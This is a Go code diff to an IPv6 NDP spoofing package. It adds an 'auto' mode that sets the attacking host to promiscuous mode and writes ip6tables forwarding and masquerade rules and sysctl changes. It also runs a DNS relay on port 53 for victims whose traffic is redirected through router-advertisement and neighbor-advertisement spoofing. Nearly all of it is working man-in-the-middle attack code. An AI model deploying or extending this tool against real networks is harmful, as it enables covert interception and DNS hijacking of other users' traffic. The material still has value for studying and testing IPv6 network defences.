@@ -2,17 +2,21 @@
 package ndpspoof
 
 import (
+	"context"
 	"errors"
 	"fmt"
+	"io"
 	"maps"
 	"net"
 	"net/netip"
 	"os"
 	"os/exec"
 	"slices"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 
 	"github.com/mdlayher/packet"
@@ -20,18 +24,23 @@ import (
 	"github.com/shadowy-pycoder/mshark/layers"
 	"github.com/shadowy-pycoder/mshark/network"
 	"github.com/shadowy-pycoder/mshark/oui"
+	"golang.org/x/sys/unix"
 )
 
 var (
-	defaultRLT                = 600 // also used for RDNSS lifetime
-	probeThrottling           = 50 * time.Millisecond
-	probeTargetsInterval      = 60 * time.Second
-	refreshNDPCacheInterval   = 15 * time.Second
-	ndpSpoofTargetsInterval   = 1 * time.Second
-	ndpUnspoofPacketCount     = 5
-	ndpUnspoofTargetsInterval = 500 * time.Millisecond
-	errNDPSpoofConfig         = fmt.Errorf(
-		`failed parsing ndp spoof options. Example: "ra true;na true;rdnss true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;;dns 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s"`,
+	defaultRLT                              = 600 // also used for RDNSS lifetime
+	probeThrottling                         = 50 * time.Millisecond
+	probeTargetsInterval                    = 60 * time.Second
+	refreshNDPCacheInterval                 = 15 * time.Second
+	ndpSpoofTargetsInterval                 = 1 * time.Second
+	ndpUnspoofPacketCount                   = 5
+	ndpUnspoofTargetsInterval               = 500 * time.Millisecond
+	udpBufferSize                           = 4096
+	readTimeoutUDP            time.Duration = 5 * time.Second
+	writeTimeoutUDP           time.Duration = 5 * time.Second
+	errInvalidWrite                         = errors.New("invalid write result")
+	errNDPSpoofConfig                       = fmt.Errorf(
+		`failed parsing ndp spoof options. Example: "ra true;na true;rdnss true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;;dns 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s;auto true"`,
 	)
 )
 
@@ -48,11 +57,12 @@ type NDPSpoofConfig struct {
 	NA             bool
 	RDNSS          bool
 	Debug          bool
+	Auto           bool
 }
 
 // NewNDPSpoofConfig creates NDPSpoofConfig from a list of options separated by semicolon and logger.
 //
-// Example: "ra true;na true;rdnss true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;dns 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s".
+// Example: "ra true;na true;rdnss true;targets fe80::3a1c:7bff:fe22:91a4,fe80::b6d2:4cff:fe9a:5f10;dns 2001:4860:4860::8888;gateway fe80::1;fullduplex false;debug true;interface eth0;prefix 2001:db8:7a31:4400::/64;router_lifetime 30s;auto true".
 //
 // When ra (router advertisement) and na (neighbor advertisement) are both false or not specified, ra set to true.
 //
@@ -142,6 +152,15 @@ func NewNDPSpoofConfig(s string, logger *zerolog.Logger) (*NDPSpoofConfig, error
 				nsc.Debug = true
 			case "false", "0":
 				nsc.Debug = false
+			default:
+				return nil, fmt.Errorf("unknown value %q for %q", val, key)
+			}
+		case "auto":
+			switch val {
+			case "true", "1":
+				nsc.Auto = true
+			case "false", "0":
+				nsc.Auto = false
 			default:
 				return nil, fmt.Errorf("unknown value %q for %q", val, key)
 			}
@@ -239,6 +258,10 @@ type NDPSpoofer struct {
 	raEnabled    bool
 	naEnabled    bool
 	rdnssEnabled bool
+	debug        bool
+	auto         bool
+	opts         map[string]string
+	gwConn       *net.UDPConn
 	targets      []netip.Addr
 	dnsServers   []netip.Addr
 	gwIP         *netip.Addr
@@ -458,17 +481,22 @@ func NewNDPSpoofer(conf *NDPSpoofConfig) (*NDPSpoofer, error) {
 		}
 		return nil, fmt.Errorf("failed to listen: %v", err)
 	}
+	ndpspoofer.debug = conf.Debug
+	ndpspoofer.auto = conf.Auto
+	if ndpspoofer.auto {
+		ndpspoofer.opts = make(map[string]string, 15)
+	}
 	// setting up logger
 	if conf.Logger != nil {
 		lvl := zerolog.InfoLevel
-		if conf.Debug {
+		if ndpspoofer.debug {
 			lvl = zerolog.DebugLevel
 		}
 		logger := conf.Logger.Level(lvl)
 		ndpspoofer.logger = &logger
 	} else {
 		zerolog.SetGlobalLevel(zerolog.InfoLevel)
-		if conf.Debug {
+		if ndpspoofer.debug {
 			zerolog.SetGlobalLevel(zerolog.DebugLevel)
 		}
 		logger := zerolog.New(os.Stdout).With().Timestamp().Logger()
@@ -480,6 +508,46 @@ func NewNDPSpoofer(conf *NDPSpoofConfig) (*NDPSpoofer, error) {
 func (nr *NDPSpoofer) Start() {
 	nr.startingFlag.Store(true)
 	nr.logger.Info().Msg("[ndp spoofer] Started")
+	if nr.auto {
+		nr.logger.Info().Msg("[ndp spoofer] Configuring system")
+		if err := nr.applySettings(); err != nil {
+			nr.logger.Fatal().Err(err).Msg("[ndp spoofer] Failed while configuring system. Are you root?")
+		}
+		if !nr.rdnssEnabled {
+			// run DNS server if no user provided address added
+			nr.rdnssEnabled = true
+			nr.dnsServers = append(nr.dnsServers, *nr.hostIP)
+			lc := net.ListenConfig{
+				Control: func(network, address string, conn syscall.RawConn) error {
+					var operr error
+					size := 2 * 1024 * 1024
+					if err := conn.Control(func(fd uintptr) {
+						operr = unix.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.SO_REUSEADDR, 1)
+						operr = unix.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.SO_SNDBUF, size)
+						operr = unix.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.SO_RCVBUF, size)
+					}); err != nil {
+						return err
+					}
+					return operr
+				},
+			}
+			pconn, err := lc.ListenPacket(context.Background(), "udp", ":53")
+			if err != nil {
+				nr.logger.Fatal().Err(err).Msgf("[ndp spoofer] failed listening on %s:53", nr.hostIP)
+			}
+			nr.gwConn = pconn.(*net.UDPConn)
+			var gwIPv4 netip.Addr
+			gwIPv4, err = network.GetGatewayIPv4FromInterface(nr.iface.Name)
+			if err != nil {
+				gwIPv4 = netip.MustParseAddr("8.8.8.8")
+			}
+			gwIPv4DNS := &net.UDPAddr{IP: net.ParseIP(gwIPv4.String()), Port: 53}
+			nr.wg.Add(1)
+			go nr.listenAndServeDNS(gwIPv4DNS)
+			nr.logger.Info().Msgf("[ndp spoofer] Running DNS server on %s:53", nr.hostIP)
+			nr.logger.Info().Msgf("[ndp spoofer] DNS resolver is %s:53", gwIPv4)
+		}
+	}
 	go nr.handlePackets()
 	if nr.raEnabled {
 		nr.logger.Info().Msg("[ndp spoofer] RA spoofing enabled")
@@ -532,6 +600,10 @@ func (nr *NDPSpoofer) Stop() error {
 	}
 	nr.wg.Wait()
 	close(nr.packets)
+	if nr.auto {
+		nr.logger.Info().Msg("[ndp spoofer] Restoring system settings")
+		nr.clearSettings()
+	}
 	nr.logger.Info().Msg("[ndp spoofer] Stopped")
 	return nil
 }
@@ -768,5 +840,230 @@ func (nr *NDPSpoofer) refreshNeighCache() {
 			nr.neighCache.Refresh()
 			nr.logger.Info().Msgf("[ndp spoofer] Detected targets: %s", nr.neighCache)
 		}
+	}
+}
+
+func (nr *NDPSpoofer) applySettings() error {
+	promisc := network.GetPromiscuous(nr.iface.Name)
+	if promisc < 0 {
+		return fmt.Errorf("failed getting promiscuous mode value from %s", nr.iface.Name)
+	}
+	if err := network.SetPromiscuous(nr.iface.Name, true); err != nil {
+		return err
+	}
+	if promisc > 0 {
+		nr.opts["promisc"] = "true"
+	} else {
+		nr.opts["promisc"] = "false"
+	}
+	cmd := fmt.Sprintf(`
+ip6tables -A INPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
+ip6tables -A OUTPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
+ip6tables -A FORWARD -i %s -j ACCEPT
+ip6tables -t nat -A POSTROUTING -o %s -j MASQUERADE
+`, nr.iface.Name, nr.iface.Name)
+	if err := nr.runRuleCmd(cmd); err != nil {
+		return err
+	}
+	nr.runSysctlOptCmd("net.ipv4.ip_forward", "1")
+	nr.runSysctlOptCmd("net.ipv6.conf.all.forwarding", "0")
+	nr.runSysctlOptCmd("net.ipv6.conf.all.accept_ra", "0")
+	nr.runSysctlOptCmd("net.ipv6.conf.all.accept_redirects", "0")
+	nr.runSysctlOptCmd("fs.file-max", "100000")
+	nr.runSysctlOptCmd("net.core.somaxconn", "65535")
+	nr.runSysctlOptCmd("net.core.netdev_max_backlog", "65536")
+	nr.runSysctlOptCmd("net.ipv4.tcp_fin_timeout", "15")
+	nr.runSysctlOptCmd("net.ipv4.tcp_tw_reuse", "1")
+	nr.runSysctlOptCmd("net.ipv4.tcp_max_tw_buckets", "65536")
+	nr.runSysctlOptCmd("net.ipv4.tcp_window_scaling", "1")
+	return nil
+}
+
+func (nr *NDPSpoofer) clearSettings() error {
+	cmd := fmt.Sprintf(`
+ip6tables -D INPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
+ip6tables -D OUTPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
+ip6tables -D FORWARD -i %s -j ACCEPT
+ip6tables -t nat -D POSTROUTING -o %s -j MASQUERADE
+`, nr.iface.Name, nr.iface.Name)
+	if err := nr.runRuleCmd(cmd); err != nil {
+		return err
+	}
+	cmds := make([]string, 0, len(nr.opts))
+	for _, cmd := range slices.Sorted(maps.Keys(nr.opts)) {
+		switch cmd {
+		case "promisc":
+			enable, _ := strconv.ParseBool(nr.opts[cmd])
+			network.SetPromiscuous(nr.iface.Name, enable)
+		default:
+			cmds = append(cmds, fmt.Sprintf("sysctl -w %s=%q", cmd, nr.opts[cmd]))
+		}
+	}
+	cmdRestoreOpts := strings.Join(cmds, "\n")
+	return nr.runRuleCmd(cmdRestoreOpts)
+}
+
+func (nr *NDPSpoofer) runRuleCmd(rule string) error {
+	var setex string
+	if nr.debug {
+		setex = "set -ex"
+	}
+	cmd := exec.Command("bash", "-c", fmt.Sprintf(`
+    %s
+    %s
+    `, setex, rule))
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if !nr.debug {
+		cmd.Stdout = nil
+	}
+	return cmd.Run()
+}
+
+func (nr *NDPSpoofer) runSysctlOptCmd(opt string, value string) error {
+	data, err := os.ReadFile(fmt.Sprintf("/proc/sys/%s", strings.ReplaceAll(opt, ".", "/")))
+	if err != nil {
+		return err
+	}
+	var setex string
+	if nr.debug {
+		setex = "set -ex"
+	}
+	cmdOpt := fmt.Sprintf(`sysctl -w %s=%q`, opt, value)
+	cmd := exec.Command("bash", "-c", fmt.Sprintf(`
+    %s
+    %s`, setex, cmdOpt))
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if !nr.debug {
+		cmd.Stdout = nil
+	}
+	if err := cmd.Run(); err != nil {
+		return err
+	}
+	nr.opts[opt] = strings.ReplaceAll(strings.TrimRight(string(data), "\n"), "\t", " ")
+	return nil
+}
+
+type udpConn struct {
+	*net.UDPConn
+	srcAddr *net.UDPAddr
+	written atomic.Uint64
+}
+
+func (nr *NDPSpoofer) listenAndServeDNS(gwDNS *net.UDPAddr) {
+	buf := make([]byte, udpBufferSize)
+	for {
+		select {
+		case <-nr.quit:
+			nr.wg.Done()
+			return
+		default:
+			err := nr.gwConn.SetReadDeadline(time.Now().Add(readTimeoutUDP))
+			if err != nil {
+				if errors.Is(err, net.ErrClosed) {
+					continue
+				}
+				nr.logger.Error().Err(err).Msg("[ndp spoofer] Failed setting read deadline")
+				continue
+			}
+			n, srcAddr, er := nr.gwConn.ReadFromUDP(buf)
+			if n > 0 {
+				c, err := net.DialUDP("udp", nil, gwDNS)
+				if err != nil {
+					nr.logger.Error().Err(err).Msgf("[ndp spoofer] Failed creating UDP connection %s→ %s", srcAddr, gwDNS)
+					continue
+				}
+				conn := &udpConn{UDPConn: c, srcAddr: srcAddr}
+				nr.logger.Debug().Msgf("[ndp spoofer] New DNS connection from %s", conn.srcAddr)
+				err = conn.SetWriteDeadline(time.Now().Add(writeTimeoutUDP))
+				if err != nil {
+					if errors.Is(err, net.ErrClosed) {
+						continue
+					}
+					nr.logger.Error().Err(err).Msg("[ndp spoofer] Failed setting write deadline")
+					continue
+				}
+				nw, err := conn.Write(buf[:n])
+				if err != nil {
+					if ne, ok := err.(net.Error); ok && ne.Timeout() {
+						continue
+					}
+					if errors.Is(err, net.ErrClosed) {
+						continue
+					}
+					continue
+				}
+				nr.wg.Add(1)
+				conn.written.Add(uint64(nw))
+				go nr.handleDNSConnection(conn)
+			}
+			if er != nil {
+				if ne, ok := er.(net.Error); ok && ne.Timeout() {
+					continue
+				}
+				if errors.Is(err, net.ErrClosed) {
+					continue
+				}
+				if errors.Is(er, io.EOF) {
+					continue
+				}
+				nr.logger.Error().Err(er).Msg("[ndp spoofer] Failed reading UDP message")
+				continue
+			}
+		}
+	}
+}
+
+func (nr *NDPSpoofer) handleDNSConnection(conn *udpConn) {
+	defer func() {
+		conn.Close()
+		nr.logger.Debug().Msgf("Copied %s for udp src: %s", network.PrettifyBytes(int64(conn.written.Load())), conn.srcAddr)
+		nr.wg.Done()
+	}()
+	buf := make([]byte, udpBufferSize)
+	er := conn.SetReadDeadline(time.Now().Add(readTimeoutUDP))
+	if er != nil {
+		if errors.Is(er, net.ErrClosed) {
+			return
+		}
+		nr.logger.Debug().Err(er).Msg("[ndp spoofer] Failed setting read deadline")
+		return
+	}
+	nread, er := conn.Read(buf)
+	if nread > 0 {
+		er := nr.gwConn.SetWriteDeadline(time.Now().Add(writeTimeoutUDP))
+		if er != nil {
+			if errors.Is(er, net.ErrClosed) {
+				return
+			}
+			nr.logger.Debug().Err(er).Msg("[ndp spoofer] Failed setting write deadline")
+			return
+		}
+		nw, ew := nr.gwConn.WriteToUDP(buf[0:nread], conn.srcAddr)
+		if nw < 0 || nread < nw {
+			nw = 0
+			if ew == nil {
+				ew = errInvalidWrite
+			}
+		}
+		conn.written.Add(uint64(nw))
+		if ew != nil {
+			if errors.Is(ew, net.ErrClosed) {
+				return
+			}
+			if ne, ok := ew.(net.Error); ok && ne.Timeout() {
+				return
+			}
+		}
+		if nread != nw {
+			nr.logger.Debug().
+				Err(io.ErrShortWrite).
+				Msgf("[ndp spoofer] Failed sending message %s→ %s", conn.LocalAddr(), conn.srcAddr)
+			return
+		}
+	}
+	if er != nil {
+		return
 	}
 }
